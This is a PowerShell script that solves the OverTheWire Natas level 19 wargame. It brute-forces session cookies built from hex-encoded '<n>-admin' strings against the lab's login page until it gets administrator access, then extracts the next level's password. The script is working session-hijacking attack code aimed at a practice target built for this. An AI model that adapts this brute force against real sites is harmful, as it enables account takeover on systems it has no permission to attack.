$Username = 'natas19'
$Password = Get-Content -Path ../Pwds.txt | Select-Object -Skip 18 | Select-Object -First 1
$Creds = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("$($Username):$($Password)"))

function Invoke-PostRequest([string]$SessionId) {
    $Request = @{
        Uri = 'http://natas19.natas.labs.overthewire.org/'
        Method = 'POST'
        Headers = @{ 
            Authorization = "Basic $Creds"
            'Content-Type' = 'application/x-www-form-urlencoded'
            Cookie = "PHPSESSID=$SessionId"
        }
        Body = @{
            username = 'admin'
            password = ""
        }
    }

    return Invoke-WebRequest @Request
}

foreach ($n in 1..640) {
    Write-Host "Testing cookie $n-admin"
    $EncodedCandidate = ("$n-admin" | Format-Hex).HexBytes.ToLower() -replace ' ', ''
    $Response = Invoke-PostRequest -SessionId $EncodedCandidate
    if ($Response.Content -like "*You are an admin*") {
        $Natas20 = ($Response.Content | Select-String -Pattern "Password:\s*([^<]+)" | Select-Object -First 1).Matches.Groups[1]
        Write-Host -ForegroundColor Green "Password: $Natas20"
        exit
    }
}

